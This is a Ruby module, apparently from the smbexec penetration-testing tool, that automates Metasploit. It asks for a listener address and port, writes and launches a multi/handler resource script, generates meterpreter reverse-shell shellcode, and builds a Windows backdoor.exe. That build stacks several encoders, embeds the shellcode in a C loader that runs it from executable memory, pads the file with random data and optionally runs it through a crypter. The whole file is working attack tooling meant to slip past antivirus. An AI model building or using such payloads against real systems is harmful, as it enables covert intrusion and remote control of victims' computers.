require 'utils'

module Lib_meta
	include Utils

	def get_meter_data(dns = false)
		 # Get valid lhost
		lhost = ''
		if dns
			while lhost.empty?
				print "Enter domain name (LHOST) [#{color_banner('EX: www.pentestgeek.com')}]:"
				lhost = rgets(' ')
			end
		else
			# Get local interface IP if routed to ip of first host in options
			if Menu.opts[:hosts]
				ip = local_ip(Menu.opts[:hosts][0])
			else
				ips = all_local_ips
				if ips.length.eql? 1
					ip = ips.join
				else
					puts "Local IP addresses: #{ips.join(', ')}"
					puts
					ip = ''
				end
			end
			
			until lhost.valid_ip?
				print "Enter local address (LHOST) [#{color_banner(ip)}]:"
				lhost = rgets(' ')
				lhost = ip if lhost.empty?
			end
		end
		# Get valid lport
		lport = 0
		until (1..65535).member? lport.to_i
			print "Enter listening port (LPORT) [#{color_banner('443')}]:"
			lport = rgets(' ')
			lport = 443 if lport.empty?
		end
		puts
		return lhost, lport
	end

	# Create RC script
	def create_rc(payload, lhost, lport)
		rc = "<ruby>\n"
		rc << "sleep 3\n"
		rc << "</ruby>\n"
		rc << "spool #{@log}/msf_spool_#{Time.now.strftime('%m-%d-%Y_%H-%M')}\n"
		rc << "<ruby>\n"
		rc << "sleep 3\n"
		rc << "</ruby>\n"
		rc << "use exploit/multi/handler\n"
		rc << "set payload #{payload}\n"
		rc << "set LHOST #{lhost}\n"
		rc << "set LPORT #{lport}\n"
		rc << "set SessionCommunicationTimeout 600\n" if payload =~ /reverse_https/
		#rc << "set SessionExpirationTimoeut"
		rc << "set ExitOnSession false\n"
		rc << "set InitialAutoRunScript migrate -f\n"
		rc << "set PrependMigrate true\n" if payload =~ /reverse_tcp/
		rc << "exploit -j -z\n"

		begin
			File.open("#{@log}/rc", 'w') {|f| f.write(rc) }
		rescue => e
			print_bad("Error writting RC file: #{e}")
			return nil
		end

		print_status("Resource script created: #{@log}/rc")

		return "#{@log}/rc"
	end

	def create_handler(rc)
		# Quick check to see if xterm exists
		xterm = false
		xtermtest = `xterm -version`
		if xtermtest =~ /XTerm\(\d+/m and Menu.opts[:xterm]
			xterm = true
		end

		# Check if msfconsole exists
		msfconsoletest = `which msfconsole`
		if not msfconsoletest =~ /msfconsole/
			print_bad("msfconsole is not installed or missing from $PATH, quiting")
			return nil
		end

		if File.exists? rc
			if xterm
				system("xterm -geometry -0+0 -T msfhandler -hold -e msfconsole -r #{rc} &")
			else
				# If not xterm, try putting shells in screens
				print_status("Launching Metasploit in a screen session, once loaded hit Ctrl-a then Ctrl-d to detach and continue setup")
				puts "Press enter to continue"
				puts
				gets

				screen = "screen -S smbexec_msfhandler"
				system("#{screen} bash -c 'msfconsole -r #{rc} -q -x \"screen -d\"'")


				sleep 1

				print_status("msf handler started in screen")
			end
		else
			print_bad("Resource file doesn't seem to exist at #{rc}...")
		end
  end

  def psh_shellcode(payload, lhost, lport)
    print_status('Generating shellcode')
    msfcmd = "msfvenom --payload #{payload} LHOST=#{lhost} "
    msfcmd << "LPORT=#{lport} -f c"
    shellcode = `#{msfcmd} 2> /dev/null`
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..18] = ''
    shellcode
  end

	def build_payload(payload, lhost, lport)
		seed = Random.rand(10000 + 1)
		print_status("Building payload...")
		
		# Random number of numbers for all
		rand_array = []
		for i in 0..10000
			temp_array = [Random.rand(32767), i]
			rand_array << temp_array
		end
		rand_array.sort!

		nums = ''
		for i in 0..seed
			nums << "\"#{rand_array[i][1]}\"\n"
		end

		rand_array = []
		for i in 0..999999
			temp_array = [Random.rand(32767), i]
			rand_array << temp_array
		end
		rand_array.sort!

		nums2 = ''
		for i in 0..seed
			nums2 << "\"#{rand_array[i][1]}\"\n"
		end

		# Create msfpayload command
		base_build = "msfpayload #{payload} LHOST=#{lhost} LPORT=#{lport} "
		base_build << "SessionCommunicationTimeout=600 " if payload.eql? 'windows/meterpreter/reverse_https'
		enumber = Random.rand(9 + 3)
		base_build << "EXITFUNC=thread R |msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"
		base_build << "msfencode -e x86/jmp_call_additive -c #{enumber} -t raw |"
		base_build << "msfencode -e x86/call4_dword_xor -c #{enumber} -t raw |"
		base_build << "msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"	
		base_build << "msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX"	
		
		build = ""

		# Execute and return payload
		Menu.opts[:verbose] ? build = `#{base_build}` : capture_stderr('/dev/null') { build = `#{base_build}` }

		# Check if encodings worked, if not redo
		track = 0
		while build.eql? "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIAA"
			if track > 2
				print_bad("Issue with msfencoding, quiting module...happens once and a while, try again")
				puts
				puts "Press Ctrl-c once..."
				sleep while true
			end
			print_bad("Bad encoding, re-encoding...")
			capture_stderr('/dev/null') { build = `#{base_build}` }
			track = track + 1
		end

		# Build C file
		frame = "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n"
		frame << "#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n"
		frame << "#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n"
		frame << "{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\""
		frame << "(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)"
		frame << "\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);"
		frame << "\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, "
		frame << "PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\t"
		frame << "WaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID)"
		frame << ", INFINITE);\n}\n\nunsigned char ufs[]=\n#{nums};\nvoid main()\n{\n\tchar "
		frame << "*micro = \"#{build}\";\n\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char "
		frame << "tap[]=\n#{nums2};\n"

		File.open("#{@log}/backdoor.c", 'w') { |file| file.write(frame) }

		mingw = "#{Menu.extbin[:mingw]} -Wall #{@log}/backdoor.c -o #{@log}/backdoor.exe"

		# Compile into exe
		capture_stderr('/dev/null') { compile = `#{mingw}`}
		
		payload_path = "#{@log}/backdoor.exe"

		if file_exists? (payload_path)
			print_status("Payload compiled: #{payload_path}")
			system("strip --strip-debug #{payload_path}")
			# Get a SHA1 hash of the file
			require 'digest'
			# Encrpyt payload if crypter there
			if Menu.extbin[:crypter]
				# Check for wine
				unless `which wine`.empty?
					temp_payload_path = encrypt_payload(payload_path)
					payload_path = temp_payload_path if temp_payload_path
				end
			end
			payload_hash = Digest::SHA1.hexdigest( File.read(payload_path) )
		else
			print_bad("Could not compile binary...")
			return nil, nil
		end
		return payload_path, payload_hash
	end
	
	# Use cryper.exe to encrypt the payload
	def encrypt_payload(payload)
		print_status("Enrypting payload...")
		
		# Due to dir switch, get absolute paths of files
		new_path = "#{File.absolute_path(@log)}/enc_backdoor.exe"
		payload = File.absolute_path(payload)

		file_delete(new_path) if file_exists? new_path

		sleep 1

		cmd = "wine #{Menu.extbin[:crypter]} #{payload} #{new_path}"

		# Need to run the crypter from its dir due to dependencies
		Dir.chdir(File.dirname(Menu.extbin[:crypter])) do
			capture_stderr {
				# Run and log output
				 `#{cmd}`
			}
		end

		sleep 1

		# If file exists print info and return path
		if file_exists? new_path
			print_good("Payload successfully encrypted")
			response = new_path
		else
			print_bad("Payload encryption failed, see logs for more information")
			response = nil
		end

		return response
	end
end
